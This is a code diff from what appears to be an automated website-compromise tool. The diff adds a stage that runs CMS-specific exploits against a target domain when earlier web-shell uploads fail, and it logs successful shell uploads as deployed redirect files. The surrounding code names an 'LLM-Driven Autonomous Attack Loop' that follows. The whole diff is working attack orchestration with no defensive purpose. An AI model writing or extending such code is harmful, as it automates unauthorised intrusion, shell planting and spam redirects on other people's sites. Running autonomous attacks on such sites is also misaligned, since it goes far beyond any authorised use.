@@ -24,6 +24,7 @@ import { deployHistory } from "../drizzle/schema";
 import { eq } from "drizzle-orm";
 import { getDeployLearnings } from "./ai-learning";
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
+import { runNonWpExploits, type NonWpScanResult } from "./non-wp-exploits";
 
 function parseSeoKeywords(input: unknown): string[] {
   if (!input) return [];
@@ -714,10 +715,85 @@ export function registerOneClickSSE(app: Express) {
         }
       }
 
+      // ═══ NON-WP CMS EXPLOITS — Targeted exploits for non-WordPress CMS ═══
+      const allUploadsFailed = !result.shellInfo?.url && !altMethodUsed;
+      const sseDetectedCms = (preScreenResult?.cms || aiTargetAnalysisResult?.techStack?.cms || "").toLowerCase();
+      const sseIsNonWp = sseDetectedCms && sseDetectedCms !== "wordpress" && sseDetectedCms !== "shopify" && sseDetectedCms !== "wix" && sseDetectedCms !== "squarespace";
+      const sseIsGeneric = !sseDetectedCms || sseDetectedCms === "unknown";
+
+      if (allUploadsFailed && (sseIsNonWp || sseIsGeneric)) {
+        sendEvent({
+          type: "step_detail",
+          step: "nonwp_exploits",
+          status: "running",
+          detail: `\u{1F50D} Non-WP Exploits \u0e40\u0e23\u0e34\u0e48\u0e21\u0e17\u0e33\u0e07\u0e32\u0e19 \u2014 \u0e2a\u0e41\u0e01\u0e19 CMS-specific vulnerabilities (${sseDetectedCms || "generic"})...`,
+        });
+
+        try {
+          const nonWpResult = await runNonWpExploits({
+            targetUrl: `https://${targetDomain}`,
+            cms: sseDetectedCms || "unknown",
+            timeout: 15000,
+            onProgress: (method, detail) => {
+              sendEvent({
+                type: "step_detail",
+                step: `nonwp_${method}`,
+                status: "running",
+                detail: `\u{1F50D} [Non-WP] ${method}: ${detail}`,
+              });
+            },
+          });
+
+          const successfulUploads = nonWpResult.results.filter(
+            r => r.success && (r.shellUrl || r.uploadedPath)
+          );
+
+          if (successfulUploads.length > 0) {
+            const bestExploit = successfulUploads[0];
+            altMethodUsed = `nonwp_${bestExploit.method}`;
+            sendEvent({
+              type: "step_detail",
+              step: "nonwp_exploits",
+              status: "done",
+              detail: `\u2705 Non-WP Exploits \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08! ${bestExploit.method} (${bestExploit.technique}) \u2014 ${bestExploit.details}`,
+              data: nonWpResult,
+            });
+
+            // Add to deployed files
+            result.deployedFiles = result.deployedFiles || [];
+            for (const exploit of successfulUploads) {
+              result.deployedFiles.push({
+                type: "redirect" as const,
+                filename: exploit.method,
+                url: exploit.shellUrl || exploit.uploadedPath || "",
+                status: "deployed" as const,
+                description: `Non-WP: ${exploit.method} (${exploit.technique})`,
+              });
+            }
+            result.summary.successSteps = (result.summary.successSteps || 0) + 1;
+          } else {
+            const findings = nonWpResult.results.filter(r => r.success);
+            sendEvent({
+              type: "step_detail",
+              step: "nonwp_exploits",
+              status: findings.length > 0 ? "warning" : "done",
+              detail: `\u{1F4CB} Non-WP Exploits: ${findings.length} vulnerabilities found, no file upload \u2014 \u0e2a\u0e48\u0e07\u0e15\u0e48\u0e2d\u0e43\u0e2b\u0e49 AI Commander`,
+            });
+          }
+        } catch (e: any) {
+          sendEvent({
+            type: "step_detail",
+            step: "nonwp_exploits",
+            status: "warning",
+            detail: `Non-WP exploits error: ${e.message}`,
+          });
+        }
+      }
+
       // ═══ AI COMMANDER — LLM-Driven Autonomous Attack Loop ═══
       // Activates when all previous methods failed AND enableAiCommander is on
-      const allUploadsFailed = !result.shellInfo?.url && !altMethodUsed;
-      if (allUploadsFailed && enableAiCommander !== false) {
+      const aiCommanderNeeded = !result.shellInfo?.url && !altMethodUsed;
+      if (aiCommanderNeeded && enableAiCommander !== false) {
         sendEvent({
           type: "step_detail",
           step: "ai_commander",
